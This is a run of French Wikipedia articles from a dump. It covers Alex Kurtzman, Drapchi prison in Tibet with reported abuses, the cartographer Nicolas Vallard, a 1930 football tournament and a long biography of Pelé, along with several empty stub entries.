Il est possible de pêcher sur le lac Peyto avec un permis spécialisé pour le parc national de Banff. La saison de la pêche est ouverte entre le 1er juillet et le 31 octobre, et il est mendatoire de relâcher ses prises.

</doc>
<doc id="2846034" url="https://fr.wikipedia.org/wiki?curid=2846034" title="Alex Kurtzman">
Alex Kurtzman

Alex Kurtzman est un producteur, réalisateur et scénariste américain né le à Los Angeles. Il travaille souvent en collaboration avec Roberto Orci.
Biographie.
Kurtzman est né et a grandi à Los Angeles, en Californie où il a rencontré son ami de lycée et collaborateur de longue date Roberto Orci. Il a fréquenté l'Université de Wesleyan.
Kurtzman est le premier à s'associer avec Orci à la télévision sur la série "Hercule", pour l'unité de la télévision du Pacifique Renaissance Pictures, puis opérant à partir de Universal International. Après ils ont produit plusieurs scénarios pour faire face à l'absence de l'acteur principal Kevin Sorbo. À la suite d'un accident vasculaire cérébral dont Sorbo avait souffert au cours de la quatrième saison, la direction de l'émission a été confiée à Kurtzman et à Orci. Ils avaient tous deux 24 ans. Ils sont passés à la réalisation de films après avoir été invités à réécrire "The Island" de Michael Bay. Le film a obtenu 162 millions de $ au box-office sur un budget de 126 millions de $, ce qui a été un succès suffisant qu'ils ont été ramenés pour "Transformers" (de Michael Bay également), qui a valu 710 millions de $. Bien que "The Island", "Transformers" et "Transformers 2 : La Revanche" n'aient pas été particulièrement bien reçus par les critiques, les trois films ont rapporté une somme globale de 1,7 milliard de $. Ils ont écrit le film de 2009 "Star Trek" aux côtés de J. J. Abrams, avec lequel ils avaient cocréé la série de fiction "Fringe" de la Fox.
Après le succès, Kurtzman a servi comme producteur consultant sur le spectacle pour le reste du temps.
En 2011, le magazine "Forbes" décrit Orci et Kurtzman comme des « armes secrètes d'Hollywood » et que, au cours des six années précédentes, leurs films avaient rapporté un total de plus de 3 milliards $ au box-office. Le partenariat a également écrit "Des gens comme nous" à l'origine connu sous le nom de "Welcome to People", qui était le premier film de Kurtzman.
En avril 2014, à la fois Orci et Kurtzman ont confirmé à "Variety" qu'ils ne voulaient plus travailler ensemble sur des projets de films. Ils ont ajouté qu'ils travailleraient encore ensemble, mais seulement sur des projets de télévision.
Il est ensuite chargé de réaliser le reboot de la franchise "La Momie" et de relancer un univers partagé en hommage aux "Universal Monsters".
Vie privée.
En 2002, Kurtzman a épousé Samantha Counter, la fille de l'avocat Nick Counter.

</doc>
<doc id="2846040" url="https://fr.wikipedia.org/wiki?curid=2846040" title="Eloyse Lesueur">
Eloyse Lesueur



</doc>
<doc id="2846057" url="https://fr.wikipedia.org/wiki?curid=2846057" title="Beaufort County Airport">
Beaufort County Airport



</doc>
<doc id="2846058" url="https://fr.wikipedia.org/wiki?curid=2846058" title="Autovia de Pontevedra à Ponteareas A-57">
Autovia de Pontevedra à Ponteareas A-57



</doc>
<doc id="2846060" url="https://fr.wikipedia.org/wiki?curid=2846060" title="Autovia De Lérida à la frontière française A-14">
Autovia De Lérida à la frontière française A-14



</doc>
<doc id="2846062" url="https://fr.wikipedia.org/wiki?curid=2846062" title="Airport du comté de Beaufort">
Airport du comté de Beaufort



</doc>
<doc id="2846065" url="https://fr.wikipedia.org/wiki?curid=2846065" title="Wandel">
Wandel

Wandel peut faire référence à :

</doc>
<doc id="2846066" url="https://fr.wikipedia.org/wiki?curid=2846066" title="Prison de Drapchi">
Prison de Drapchi

La prison de Drapchi, connue en chinois sous l'appellation de « prison Di Yi Jianyu-No 1 », est la plus grande prison du Tibet, sise dans la capitale Lhassa.
Historique.
À l'origine le site de Drapchi accueillait le siège de la monnaie tibétaine.
Construite initialement pour servir de garnison militaire tibétaine, elle fut transformée en prison après le soulèvement tibétain de 1959 contre la Chine.
Ouverte officiellement comme prison en 1965, elle est formée d'une série de neuf unités et a été récemment agrandie et restructurée. La population carcérale est estimée à 1000 détenus dont 600 considérés comme prisonniers politiques, âgés de 18 à 85 ans, parmi lesquels beaucoup de moines et nonnes.
Selon les réfugiés tibétains en exil, la prison a acquis une réputation tristement célèbre et est redoutée des Tibétains en raison de sa gestion dure. Des associations de Tibétains en exil ont fait état de brutalités.
En 2002, Amnesty International a demandé que la lumière soit faite sur la répression de mouvements de mécontentement ayant éclaté dans la prison les et .
Exécutions publiques.
En , Palden Gyatso fut témoin d’exécutions publiques qu’il décrit avec horreur dans son autobiographie ("Le feu sous la neige"). Il fut amené avec des centaines d’autres Tibétains des prisons de Lhassa à la prison de Drapchi pour assister à une réunion annuelle de « récompenses et châtiments ». Les gardes sortirent des rangs ceux des prisonniers qui allaient être exécutés, ligotés et bâillonnés, ils portaient une pancarte autour du cou où figuraient des caractères chinois. Palden Gyatso fut contraint à s’avancer près de Kundaling Kusang (Pamo Kusang), une célèbre femme tibétaine au visage enflé et couvert de meurtrissures, pouvant à peine respirer et qui était accusée d’activités contre-révolutionnaires visant à renverser la dictature prolétarienne. Elle fut, ainsi que 14 autres Tibétains, contraints de s’agenouiller devant une fosse près du monastère de Séra, et abattus par un peloton d’exécution, les survivants à la première rafale furent achevés d’une balle à bout portant. Les familles furent informées, le nombre de balles, la taille de la corde ayant servi à ligoter et le coût étaient indiqués.
Tortures.
Différents témoignages signalent des cas de torture à Drapchi.
Palden Gyatso est transféré à la prison de Drapchi en 1964. Il y sera notamment battu et subira de nombreuses tortures avec électrochocs. Ani Patchen cette princesse tibétaine, devenue nonne, dirigea une armée dans le Kham et rejoint la résistance tibétaine. Capturée en 1959, elle passe 21 ans dans les prisons chinoises, dont 11 ans à Drapchi, subissant des tortures quasi-quotidiennes. Tenzin Choedrak considère Drapchi comme l'« antichambre de la mort », il évoque les séances de Thamzing et les cas de tortures.
La nonne tibétaine Choeying Kunsang condamnée à 4 ans de prison en 1995 pour avoir participé à une manifestation indique :
Conditions de libération.
À sa sortie de prison, les autorités informent Choeying Kunsang que si elle évoque ses conditions de vie à Drapchi, elle sera de nouveau arrêtée et remise en prison avec une peine doublée.
Mouvement de protestation de mai 1998.
Reprenant des « informations recueillies de source non officielle », Amnesty International rapporte la mort de neuf détenus en 1998, pour la plupart des moines et des nonnes : « Ces neuf détenus seraient morts des suites de passages à tabac et de diverses autres formes de torture et de mauvais traitements que leur auraient administrés des surveillants pendant et après les troubles de » (manifestations lors de cérémonies dans l'enceinte de la prison, grève de la faim).
Selon Amnesty International, les autorités chinoises, après avoir démenti ces incidents, ont donné une autre version des faits : « Une poignée de criminels est allée jusqu'à crier ouvertement des slogans séparatistes, à insulter, à assiéger et à agresser des surveillants. Les agents de police de la prison ont pris des mesures pour mettre fin à cette situation, conformément aux dispositions de la loi sur les prisons. La reprise en main de la situation n’a donné lieu à aucune mort d’homme due à des coups.
Dans la mesure où les actes de certains de ces criminels constituaient des infractions portant atteinte à l’ordre de l’administration pénitentiaire et constituant une instigation à porter atteinte à l’intégrité de l’État, ces délinquants
ont fait l’objet de sanctions pénales supplémentaires, conformément à la loi ». Amnesty International note que « ces déclarations officielles sont contredites par les témoignages d'anciens détenus ».
Le rapport d'Amnesty International précise que la majorité des prisonniers d'opinion incarcérés à Drapchi le sont en raison de « leurs activités en faveur de l'indépendance du Tibet » ou de « leur fidélité à leur chef spirituel, le dalaï-lama ».

</doc>
<doc id="2846067" url="https://fr.wikipedia.org/wiki?curid=2846067" title="Autovia de Séville au Portugal par Rosal de la Frontera A-47">
Autovia de Séville au Portugal par Rosal de la Frontera A-47



</doc>
<doc id="2846073" url="https://fr.wikipedia.org/wiki?curid=2846073" title="BFT">
BFT

BFT peut faire référence à :

</doc>
<doc id="2846074" url="https://fr.wikipedia.org/wiki?curid=2846074" title="Bft">
Bft



</doc>
<doc id="2846089" url="https://fr.wikipedia.org/wiki?curid=2846089" title="Beng">
Beng

Anthroponyme.
Prénom.
Beng est un prénom masculin d'origine germanique.

</doc>
<doc id="2846090" url="https://fr.wikipedia.org/wiki?curid=2846090" title="AGC Bologne">
AGC Bologne



</doc>
<doc id="2846092" url="https://fr.wikipedia.org/wiki?curid=2846092" title="Communauté d’agglomération du grand Rodez">
Communauté d’agglomération du grand Rodez



</doc>
<doc id="2846094" url="https://fr.wikipedia.org/wiki?curid=2846094" title="Sébazac">
Sébazac



</doc>
<doc id="2846097" url="https://fr.wikipedia.org/wiki?curid=2846097" title="Nicolas Vallard">
Nicolas Vallard

Nicolas Vallard est un navigateur et cartographe français du , né au Havre. Il collabora à l'école de cartographie de Dieppe et publia un atlas de cartes des continents en 1547. 
Cartes de la Nouvelle-France.
La venue de l’explorateur Jacques Cartier en terre de Canada ouvrit une porte toute grande au développement des Indes Occidentales. Aussitôt Cartier revenu à Saint-Malo que François lui ordonna de poursuivre ses explorations. En 1541, Cartier implantait près de Stadaconé l'établissement de Charlesbourg-Royal. En 1542, Jean-François de la Rocque de Roberval arrive à Charlesbourg-Royal qu’il rebaptise France-Roy (le site, aujourd'hui appelé Cap-Rouge, est intégré dans Québec). Ces voyages de Cartier et de Roberval ne virent pas l'établissement d'une colonie permanente, mais ils firent progresser la cartographie.
Les commerçants accompagnés de missionnaires et de coureurs des bois entrèrent en scène, aidés par les nombreux cartographes répondant au nouveau besoin. Parmi ces cartographes, soulignons Pierre Desceliers ou Nicolas Vallard et son atlas, tous deux de l’école de cartographie de Dieppe.
C'est dans les enluminures des cartes géographiques de Nicolas Vallard (mais également dans celles de Pierre Desceliers et de Guillaume Le Testu), que l'on trouve les premières représentations du territoire canadien (Hochelaga, Québec), de ses habitants, de sa faune et de sa flore.
L'Atlas de Nicolas Vallard.
L'atlas du monde de Nicolas Vallard, contient 15 cartes nautiques, des tables de déclinaisons, etc.
Les quinze cartes portulans de cet atlas, témoignent d'une grande connaissance de la cartographie planétaire. Les contours de l'Australie sont une fois de plus représentés comme dans beaucoup d'autres cartes marines réalisées par les cartographes de l'école de cartographie de Dieppe.

</doc>
<doc id="2846099" url="https://fr.wikipedia.org/wiki?curid=2846099" title="Coupe des nations de football 1930">
Coupe des nations de football 1930

La Coupe des nations de football 1930 fut un tournoi amical de football disputé du au à Genève en Suisse. Le tournoi fut organisé à Genève par le Servette FC afin de célébrer son et pour inaugurer le Stade des Charmilles. 
Règlement de la compétition.
Le premier tour comporte 5 matchs et donnera 5 qualifiés pour le second tour. Trois équipes seront repêchées parmi les 5 perdants du premier tour : une sera tirée au sort et exempt de repêchage et sera donc automatiquement qualifiée pour les quarts de finale. Les 4 autres perdants disputeront les repêchages et deux équipes seront qualifiées. Les 4 vainqueurs des quarts de finale seront qualifiés pour la demi-finale. Les deux vainqueurs des demi-finales seront qualifiés pour la finale tandis que les perdant disputeront la petite finale. En cas d'égalité après prolongation les équipes seront départagée par deux prolongations de deux fois 15 minutes. En cas de nouvelle égalité le match continue et la première équipe qui marque remporte la partie et met fin aux prolongations avec toutefois une limite de 30 minutes. Si aucune équipe n'a pris l'avantage durant ce laps de temps, elles seront départagées par un tirage au sort.
Arbitres.
Messieurs Albert Prince-Cox et Stanley Rous (Grande-Bretagne) ; René Mercet, Paul Ruoff, Enderlin, Giovarini (Suisse).
Résultats.
Quarts de finale.
 
 
Demi-finales.
 

</doc>
<doc id="2846102" url="https://fr.wikipedia.org/wiki?curid=2846102" title="Pelé">
Pelé

Edson Arantes do Nascimento, dit Pelé, né le à Três Corações (Brésil) et mort le à São Paulo (Brésil), est un footballeur international brésilien évoluant au poste d'attaquant et de meneur de jeu du milieu des années 1950 jusqu'en 1977.
Figure majeure du football, Pelé est considéré comme le plus grand joueur de tous les temps. Surnommé "" (), Pelé est l'unique joueur à avoir remporté trois fois la Coupe du monde de football, en 1958, 1962 et 1970. Désigné athlète du siècle par le Comité international olympique (CIO), joueur du par la Fédération internationale de football association (FIFA), lauréat d'un FIFA Ballon d'Or Prix d'Honneur (été décerné qu'une seule fois en 2014), membre de l'équipe mondiale du, l’attaquant brésilien est connu pour avoir marqué plus de mille buts dans sa carrière, une partie d'entre eux lors de matchs amicaux.
Attaquant intérieur gauche emblématique du Santos FC, il remporte à onze reprises le championnat de São Paulo dans les années 1950 et 1960 avec le club ainsi que deux doublés avec la Coupe intercontinentale et la Copa Libertadores en 1962 et 1963. Sortant d'une retraite sportive annoncée pour rejoindre le championnat des États-Unis en 1975, l'attaquant brésilien marque l'histoire du New York Cosmos en remportant le championnat 1977 mais aussi dans un rôle d'ambassadeur pour le développement du football dans le pays.
Bénéficiant d'une notoriété mondiale, icône sportive, Pelé prête son image à diverses entreprises et causes après sa retraite sportive. Il devient ambassadeur pour l'Organisation des Nations unies (ONU) et l'Organisation des Nations unies pour l'éducation, la science et la culture (UNESCO) à l'Éducation, l'Écologie et l'Environnement. Ministre extraordinaire des Sports du Brésil entre 1995 et 1998, il troque sa carrière politique pour celle d'ambassadeur lors d'événements organisés au Brésil comme les Jeux mondiaux militaires d'été de 2011 ou la Coupe du monde de football 2014. Parmi ses autres activités, Pelé fut également acteur, scénariste et producteur.
Biographie.
Enfance et premières années.
Edson Arantes do Nascimento naît à Três Corações (en français : « "Trois Cœurs" »), dans l'État du Minas Gerais, au nord de Rio de Janeiro, le . Fils de Dondinho (João Ramos do Nascimento), ex-footballeur amateur, et de Celeste Arantes (1922-2024), il a un frère Jair et une sœur Maria Lucia. Pour sa date de naissance et son nom de famille, les registres de l'état civil de l'époque indiqueraient le et ceux de la paroisse où il a été baptisé mentionnent le . Son prénom est répertorié de manière différente selon les deux actes : le premier fait état de (en hommage à Thomas Edison en raison de l'arrivée de l'électricité dans le village) tandis que le second mentionne . Le prénom et la date du seront les informations qui resteront finalement. Il est tout d'abord surnommé par sa famille. À l'âge de trois ans, sa famille quitte Três Corações pour la municipalité de Bauru, dans l'État de São Paulo, où son père décroche un emploi de fonctionnaire et une place dans l'équipe de football de la ville.
Enfant très actif, sa mère le laisse quelquefois accompagner son père lors de ses entraînements de football. Ce serait lors d'un de ces entraînements qu'il aurait acquis le surnom de Pelé. Le petit Edson, qui n'avait que trois ans, s'amusait avec le gardien du Vasco de São Lourenço, le club de son père. C'est alors que son père remarque qu'il crie en essayant de prononcer le nom du gardien, un certain Bilé. deviendra et le surnom de l'enfant (même si sa famille et ses proches continueront à l'appeler Edson). Pelé n'a pas apprécié ce surnom et s'est battu avec le camarade de classe qui lui avait donné ce surnom. Dans son autobiographie, Pelé a déclaré qu'il n'avait aucune idée de la signification de ce nom, pas plus que ses anciens amis. En dehors de l'affirmation selon laquelle le nom est dérivé de Bilé, et qu'il signifie en hébreu, le mot n'a aucune signification en portugais.
La première équipe de Pelé fut le Sete de Setembro, une équipe qui jouait sur un terrain en terre, nommée d'après la rue qui était le coin de la maison de Pelé. De Sete de Setembro, Pelé est ensuite allé à Ameriquinha, où il a porté des chaussures de football pour la première fois. Il fut champion du championnat local, le Torneio Início. À l'âge de 13 ans, Pelé commence à jouer pour , une équipe de jeunes du Bauru Atlético Clube, qui a remporté deux championnats de jeunes. Pelé fut le plus jeune membre de l'équipe. L'équipe du Bauru Atlético Clube présente alors une grande supériorité sur ses adversaires : dans l'un des matchs, elle s'est même imposée sur le score de 21-0, Pelé étant l'un des meilleurs buteurs de la rencontre avec sept buts inscrits. Au cours de sa première année d'existence, l'équipe fut championne avec six tours d'avance. Pelé attirait déjà l'attention à l'époque, et de nombreux spectateurs venaient aux matchs dans le but d'observer le garçon. Le a été invité en 1954 à se produire dans les préliminaires d'un match de la deuxième division du championnat de l'État de São Paulo, face au champion des enfants de São Paulo. L'équipe du Bauru Atlético Clube a remporté le match par , avec cinq buts de Pelé, ce qui fut souligné dans le journal local de la ville.
L'équipe de se dissout en 1955, et les garçons décident alors de créer une nouvelle équipe, cette fois pour jouer au football en salle. Ils nomment l'équipe , d'après le Radium Futebol Clube, un club de la ville de Mococa. Le football en salle venait de devenir populaire à Bauru lorsque Pelé commence à jouer. Il participe à la première compétition de football en salle de la région. Pelé et son équipe remporte le premier championnat et plusieurs autres. Pelé se distingue alors dans ces championnats ; sa supériorité technique sur les autres est si grande que la Liga de Futebol Amador décide que Pelé ne pouvait jouer que dans les buts ou en défense. S'il passait le milieu du terrain avec le ballon, cela serait considéré une faute pour l'adversaire. Selon Pelé, le football en salle présentait des défis difficiles à relever. Il disait que ce dernier était beaucoup plus rapide que le football sur gazon et que les joueurs devaient réfléchir plus vite car tout le monde est entouré de tout le monde sur le terrain. Pelé attribue au football en salle le mérite de l'avoir aidé à penser mieux et plus vite. En outre, le football en salle lui a permis de jouer avec des adultes lorsqu'il avait environ 14 ans. Lors d'un des tournois auxquels il a participé, il a d'abord été considéré comme trop jeune pour jouer, mais il est finalement devenu le meilleur buteur de la compétition avec quatorze ou quinze buts ; , a-t-il déclaré plus tard.
En 1956, Pelé reçoit une offre du Bangu Atlético Clube, qui est refusée par Celeste, la mère de Pelé, qui ne voulait pas qu'il aille , selon ses propres mots. Pelé est également invité à jouer pour l'EC Noroeste, un club de la municipalité de Bauru. Waldemar de Brito, son entraîneur au Bauru Atlético Clube, s'oppose à cette idée, craignant que Pelé ne se blesse en jouant pour l'EC Noroeste. Waldemar de Brito lui suggère alors d'aller au Santos FC. La mère de Pelé, initialement contre l'idée car elle ne voulait pas que son fils devienne un joueur de football, est finalement convaincue par l'entraîneur de Pelé.
1956 : arrivée au Santos FC.
Pelé quitte sa famille en 1956 à l'âge de quinze ans pour s'installer à Santos et jouer au club du Santos FC en devenant professionnel. Il s'entraîne directement avec l'équipe professionnelle mais joue avec les juniors. Il dispute son premier match avec les professionnels à l'occasion d'une rencontre amicale le contre les Corinthians de San André et y marque son premier but officiel. Après la blessure d'un titulaire, il prend une place dans l'équipe type très rapidement au début de l'année 1957.
Auteur de bonnes prestations, il est convoqué en équipe du Brésil et joue le lors de la Copa Roca contre l'Argentine au Maracanã, match au cours duquel il inscrit un but (défaite 1-2). Trois jours plus tard, il est titularisé pour la première fois en équipe du Brésil et, grâce à un nouveau but, permet de battre l'Argentine 2-0. Cette convocation prématurée lui permet de croire en ses chances pour participer à la Coupe du monde 1958 qui se déroule en Suède. Il termine meilleur buteur du championnat de l'État de Sao Paulo avec dix-sept buts qui lui permettent d'être sélectionné dans l'équipe en partance pour la Suède.
1958 : premier titre de champion du monde.
Appelé à jouer sa première Coupe du monde en 1958, Pelé se blesse quelques jours avant le début de la compétition lors d'un match amical contre le SC Corinthians Paulista. Le jeune attaquant ne participe ni aux matchs amicaux de préparation ni aux deux premiers matchs de la sélection brésilienne au Mondial, une victoire (trois buts à zéro face à l'Autriche) et le premier match nul sans but de l'histoire de la Coupe du monde contre l'Angleterre. Son remplaçant Dida déçoit. Lors du troisième match décisif contre l'URSS, Pelé fait ses débuts dans la compétition. Âgé de dix-sept ans seulement, il devient alors le plus jeune participant au tournoi. Le Brésil s'impose grâce à un doublé de Vavá et se qualifie pour les quarts de finale.
Titularisé pour le reste du tournoi, le jeune attaquant du Santos FC impressionne en marquant un somptueux but qui scelle la victoire un but à zéro contre le pays de Galles en quart de finale. Il devient, à 17 ans et 239 jours, le plus jeune joueur à marquer un but en Coupe du monde. Lors de la demi-finale contre la France, Pelé signe un triplé aux , et minutes dans la victoire 5 buts à 2, au cœur d'une défense tricolore désorganisée.
Le , Pelé et ses coéquipiers affrontent la Suède, pays hôte, lors de la première finale de Coupe du monde diffusée à la télévision en direct dans plusieurs pays. Les Brésiliens prennent le contrôle du match avec deux buts de Vavá avant la mi-temps. Puis, en seconde période Pelé se distingue en marquant un but qui est toujours classé parmi les plus beaux de l'histoire de la Coupe du monde : dix minutes après le début de la seconde période, le jeune Brésilien envoie le ballon au-dessus d'un défenseur avant de l'expédier dans les filets d'une volée parfaite. Le Brésil devient pour la première fois champion du monde grâce à une large victoire 5-2 qui marque l'arrivée de Pelé sur la scène internationale. Le numéro 10 de quitte la pelouse en pleurs, épaulé par ses coéquipiers. Buteur à six reprises en l'espace de trois rencontres, Pelé termine deuxième meilleur buteur de la compétition derrière Just Fontaine et ses treize buts et devient, à dix-sept ans, le plus jeune vainqueur de la Coupe Jules Rimet.
Après cette victoire, Pelé et ses coéquipiers connaissent une véritable médiatisation à leur retour au pays (couvertures de magazines et entretiens notamment). Il s'agit du premier titre mondial du Brésil, huit ans après la terrible désillusion de 1950 où le Brésil avait perdu la finale chez lui, au Maracanã, face à son voisin l'Uruguay, effaçant ainsi le traumatisme national de cette défaite.
1962 : deuxième titre de champion du monde et épopée du Santos FC.
Malgré ce titre à 17 ans, Pelé poursuit sa carrière au Santos FC sans être le joueur le mieux payé. En raison de la superficie du Brésil et des difficultés de transport ne permettant pas la mise en place d'un championnat national régulier, le Santos FC dispute le championnat de São Paulo qui est, avec le championnat de Rio de Janeiro, l'un des deux championnats régionaux les plus relevés. Les meilleurs clubs de ces deux championnats disputent ensuite le tournoi Rio-São Paulo qui désigne de fait le champion du Brésil. Le Santos FC remporte le titre du championnat pauliste où Pelé termine meilleur buteur avec 58 buts (en 33 matchs) puis, pour la première fois de l'histoire du club, le tournoi Rio-São Paulo en 1959, puis deux nouveaux titres du championnat de São Paulo (1960, 1961). Par ailleurs, le club effectue de nombreuses tournées à travers le monde, notamment en Europe pour y rencontrer les meilleurs clubs du vieux continent qui n'hésitent pas à proposer des offres pour attirer Pelé. Pour la seule année 1960, Pelé joue 116 matchs. Cependant, le Congrès national du Brésil décide de mettre un terme à ces spéculations en le déclarant .
Titulaire indiscutable en équipe du Brésil, Pelé participe en 1962 au Chili à sa seconde Coupe du monde. Le , le Brésil affronte le Mexique qu'il bat sur le score de 2-0 grâce à des buts de Mário Zagallo et Pelé. Le , contre la Tchécoslovaquie, Pelé se blesse tout seul musculairement à la (claquage) mais reste sur le terrain jusqu'à la fin du match car les remplacements ne sont pas autorisés. Le match se termine sur un score nul et vierge de 0-0. Pelé rend hommage aux défenseurs tchécoslovaques pour leur fair-play, ces derniers ayant retenu leurs gestes afin de ne pas aggraver sa blessure. Malgré tout, Pelé ne parvient pas à se remettre sur pied et ne prend donc part à aucun autre match dans le tournoi. Mais la "Seleção", menée à nouveau par un Garrincha insaisissable et irréprochable, triomphe une seconde fois. Durant ce Mondial 1962, ayant démontré l'étendue de ses talents lors des entraînements, il était convenu que Pelé prendrait la place de gardien de but, si celui-ci se blessait et devait quitter le terrain en cours de rencontre. De même, en 1964, il sera amené à remplacer Gilmar dans les buts de son club, le Santos FC.
De retour au Brésil, il se rétablit et rejoint son club qui s'est qualifié pour la finale de la Copa Libertadores. Il ne joue que le match d'appui, le dernier, contre le CA Peñarol. Les deux équipes ayant reporté chacune un match, le Santos FC force enfin la décision en gagnant la rencontre décisive sur le score de 3-0 (doublé de Pelé). Ce titre permet au club brésilien de rencontrer le vainqueur de la Coupe d'Europe des clubs champions, le Benfica Lisbonne d'Eusébio en Coupe intercontinentale. Au match aller, le Santos FC s'impose 3-2 (doublé de Pelé) au Maracanã. Au match retour à Lisbonne, le Santos FC s'impose à nouveau contre le Benfica Lisbonne, 5-2 avec un triplé de Pelé (et après avoir mené 5 à 0) et remporte son premier titre intercontinental.
L'année suivante, le Santos FC parvient une nouvelle fois en finale de la Copa Libertadores, cette fois-ci contre le Boca Juniors, et remporte pour la deuxième fois le titre après une victoire au Maracanã à l'aller sur le score de 3-2, puis une autre au retour à la Bombonera sur le score de 2-1 dont le but victorieux inscrit par Pelé à la . Ce succès permet donc au Santos FC de disputer également la Coupe intercontinentale contre l'AC Milan. Au match aller, l'AC Milan gagne 4-2 à San Siro malgré le doublé de Pelé, mais le Santos FC remporte le match retour 4-2 (blessé, Pelé ne joue pas). Un match d'appui est nécessaire et le Santos FC s'impose 1-0, remportant pour la deuxième fois le trophée intercontinental.
1966 : déception de la Coupe du monde.
La célébrité de Pelé ne lui attire pas seulement les faveurs du public et des médias. L'attaquant de du Santos FC devient la cible de tous les défenseurs. Son club tire le maximum du phénomène et accepte un nombre important de matchs amicaux à travers le monde, exposant ainsi son joueur vedette. Souvent blessé, Pelé récupère habituellement rapidement mais les blessures à répétition, qu'elles soient consécutives à sa surexposition ou aux agressions, finissent par lui poser des problèmes.
Double tenante du titre, l'équipe du Brésil est encore favorite de la Coupe du monde 1966 organisée en Angleterre et arrive donc confiante. Le , au Goodison Park, le défenseur de la Bulgarie Dobromir Zhechev serre le marquage sur Pelé après qu'il a marqué un but sur un coup franc qu'il a provoqué. Le Bulgare multiplie les agressions, toujours en retard. Un hématome derrière le genou droit empêche la vedette de jouer le match suivant contre la Hongrie. Le Brésil s'incline trois buts à un et se retrouve au pied du mur. Titularisé pour la dernière rencontre, décisive, contre le Portugal, Pelé observe Eusébio faire la différence pour le Portugal avant d'être blessé par João Morais qui l'agresse d'un tacle des deux pieds à la demi-heure de jeu. Victime d'un grand nombre de fautes tout au long du match, Pelé, peu aidé par l'arbitrage, est impuissant et termine le match en boitant, genou bandé. Le Portugal s'impose trois buts à un et élimine le Brésil, qui quitte le tournoi dès le premier tour. Dobromir Zhechev, le défenseur bulgare, dira plus tard : . La Coupe du monde sera finalement gagnée par l'Angleterre.
1970 : troisième titre de champion du monde.
Déçu du laxisme du corps arbitral et du traitement des défenseurs adverses, Pelé se concentre sur sa carrière en club mais ne parvient pas à remporter le championnat pauliste en 1966 avant de le reconquérir l'année suivante. Alors que la Coupe du monde 1970 au Mexique se profile, Pelé revient en sélection nationale en 1968 après une pause de deux ans, née de la déception du mondial 1966. En 1968, il réalise le doublé championnat pauliste-Coupe du Brésil avec le Santos FC. L'attaquant brésilien multiplie les tournées avec son club et la sélection brésilienne à travers le monde.
À l'automne 1969, tous les médias sportifs brésiliens attendent le millième but de sa carrière (matchs amicaux inclus). Plus il s'approche de cet accomplissement, plus l'attaquant brésilien rencontre des problèmes d'efficacité. Aucune défense adverse ne souhaite être retenue dans l'histoire comme étant celle ayant encaissé ce fameux but. Le , devant au stade Maracanã, Pelé inscrit ce millième but sur penalty face au Vasco de Gama FC. Immortalisé par les caméras en noir et blanc, ce but historique entraîne une explosion de joie dans le stade et l'envahissement du terrain par des journalistes et des supporteurs. L'attaquant brésilien effectue un tour d'honneur et après vingt-cinq minutes d'interruption, le match reprend pour terminer par une victoire sur le score de deux buts à un du Santos FC.
Entraînée par Mário Zagallo, la sélection brésilienne se pose comme l'une des favorites de la Coupe du monde 1970 (qui est pour la première fois retransmise en couleur par des télévisions du monde entier). Titulaire, Pelé joue aux côtés des Jairzinho, Tostão, Rivelino et Carlos Alberto. Lors de la première journée, contre la Tchécoslovaquie, alors que le score est de 1-1, Pelé tente un lob de cinquante mètres sur le gardien Ivo Viktor et manque le cadre pour quelques centimètres. Il se reprend cependant plus tard en marquant le deuxième but de la victoire du Brésil. Au match suivant contre le tenant du titre, Pelé met en lumière le gardien anglais Gordon Banks qui repousse son tir (une tête piquée à bout portant) de façon parfaite. Cet arrêt est considéré alors comme l'un des plus beaux arrêts de gardien de l'histoire. Pelé dira d'ailleurs après le match : . Malgré l'exploit de Gordon Banks, le Brésil s'impose . Enfin, Pelé inscrit un doublé contre la Roumanie pour une courte victoire permettant au Brésil de remporter son groupe en faisant le plein de points.
Le Brésil bat ensuite le Pérou 4-2 en quart de finale, sans but de Pelé, puis retrouve un vieux rival, l'Uruguay, en demi-finale. Pour Pelé, il s'agit de l'occasion d'effacer le mauvais souvenir de 1950 pour toute une nation. Mené 0-1, le Brésil s'impose finalement 3-1 ; durant ce match Pelé effectue un grand pont sans toucher la balle devant le gardien de la "Celeste", Ladislao Mazurkiewicz, mais il ne réussit pas cependant à cadrer sa frappe après cette feinte prodigieuse. Pelé et la "Seleção" sont aux portes d'un troisième titre, tout comme l'Italie qu'ils rencontrent en finale. Pelé ouvre le score de la finale d'un but au second poteau sur un centre de Rivelino et offre en fin de match, par une passe aveugle, le quatrième but à Carlos Alberto, celui qui scelle le triomphe brésilien (4-1). Ce troisième titre mondial permet au Brésil de conquérir définitivement la Coupe Jules Rimet. Le défenseur italien Tarcisio Burgnich, adversaire de Pelé lors de la finale déclare : . Pelé a terminé sa carrière en Coupe du monde avec un record de 10 passes décisives, six passes décisives tout au long de Mexique 1970, ce qui constitue et un record. Pelé compte également trois passes décisives en finale : une contre la Suède en 1958 et deux contre l’Italie en 1970.
1974 : départ du Brésil et première retraite sportive.
Un an après ce titre, Pelé prend sa retraite internationale lors d'un match entre la "Seleçao" et la Yougoslavie au Maracanã le (score final : 2-2) sous l'ovation du public qui demande à Pelé de rester, en vain. Il poursuit cependant sa carrière en club, toujours au Santos FC, à travers les différentes compétitions et les tournées amicales dans le monde. C'est lors d'une de ces tournées en Amérique du Nord que Pelé reçoit des offres des États-Unis dès 1971 mais les décline.
En 1973, il signe un contrat avec Pepsi-Cola et à son projet d'ateliers de football pour enfants, en club il continue à réaliser de bonnes performances comme le titre du championnat pauliste remporté, ce qui incite de nombreuses personnes, dont le pouvoir politique, à réclamer le retour de Pelé en sélection pour la Coupe du monde 1974 organisée en Allemagne de l'Ouest, mais celui-ci reste sur sa position de 1971. Fin 1974 à 34 ans, il décide alors de prendre sa retraite définitive contre Ponte Preta après dix-huit années passées au Santos FC.
1975 : arrivée au Cosmos de New York et retraite définitive.
Quelques mois après ce retrait du monde du football, Pelé s'aperçoit que ses affaires en dehors du football ne se portent pas bien. Voyant ses dettes s'accumuler, le joueur brésilien est poussé à jouer un match amical avec le club libanais du Nejmeh Sporting Club pour les liquider. Après avoir reconsidéré les offres des clubs européens où le rythme des matchs est aussi élevé qu'en Amérique du Sud, il décide de s'engager dans le championnat nord-américain : la North American Soccer League (NASL).
Le , Pelé signe un contrat de trois ans pour plus de de dollars avec le Cosmos de New York. L'accord implique également Warner Communications qui obtient les droits d'image de la vedette brésilienne. Pelé s'installe à New York et participe alors à l'essor du football aux États-Unis dans un pays où ce sport reste confidentiel. Après son recrutement, les dirigeants du club new-yorkais décident de changer le maillot du club et reproduit une copie des couleurs du Santos FC.
